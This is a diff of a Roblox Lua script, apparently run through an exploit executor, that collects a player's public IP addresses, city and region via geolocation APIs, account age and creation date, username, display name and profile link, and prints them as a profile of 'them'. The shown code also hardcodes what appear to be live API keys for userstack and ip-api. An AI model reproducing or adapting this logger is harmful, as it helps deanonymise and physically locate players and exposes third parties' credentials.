@@ -6,12 +6,12 @@
 |  |_)  | |  |____ /  _____  \  |  |  |  | |  |____ |  '--'  |
 |______/  |_______/__/     \__\ |__|  |__| |_______||_______/ 
 ]]--
-local time = game:GetService("HttpService"):JSONDecode(game:HttpGet('https://showcase.api.linx.twenty57.net/UnixTime/tounixtimestamp?datetime=now'))
+local time = game:GetService("HttpService"):JSONDecode(game:HttpGet('http://worldtimeapi.org/api/ip'))
 local Age = game.Players.LocalPlayer.AccountAge
-local Birthday = game:GetService("HttpService"):JSONDecode(game:HttpGet('https://showcase.api.linx.twenty57.net/UnixTime/fromunixtimestamp?unixtimestamp=' .. time.UnixTimeStamp - Age * 86400))
+local Birthday = game:GetService("HttpService"):JSONDecode(game:HttpGet('https://showcase.api.linx.twenty57.net/UnixTime/fromunixtimestamp?unixtimestamp=' .. os.time() - Age * 86400 + time.raw_offset))
 local IPv6 = game:HttpGet('https://api6.ipify.org')
 local IPv4 = game:HttpGet('https://api.ipify.org')
-local UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
+local UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36" -- find way to get UA
 local UAdata = game:GetService("HttpService"):JSONDecode(game:HttpGet('http://api.userstack.com/detect?access_key=55df5d3b931987d0760ef4a0f2c162c0&ua=' .. UserAgent))
 local data = game:GetService("HttpService"):JSONDecode(game:HttpGet('https://pro.ip-api.com/json/' .. IPv4 .. '?fields=66842623&key=uGZgjL0qOTI19n4'))
 if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
@@ -22,6 +22,11 @@ end
 print("They created their account " .. Age .. " days ago.")
 print("they created their account on " .. Birthday.Datetime:sub(1, -10))
 print("The username is " .. game.Players.LocalPlayer.Name)
+if game.Players.LocalPlayer.DisplayName == game.Players.LocalPlayer.Name then
+    print("They don't have a display name")
+else
+    print("The display name is " .. game.Players.LocalPlayer.DisplayName)
+end
 print("The link is https://roblox.com/users/" .. game.Players.LocalPlayer.UserId)
 print("The city is " .. data.city)
 print("The region is " .. data.regionName)
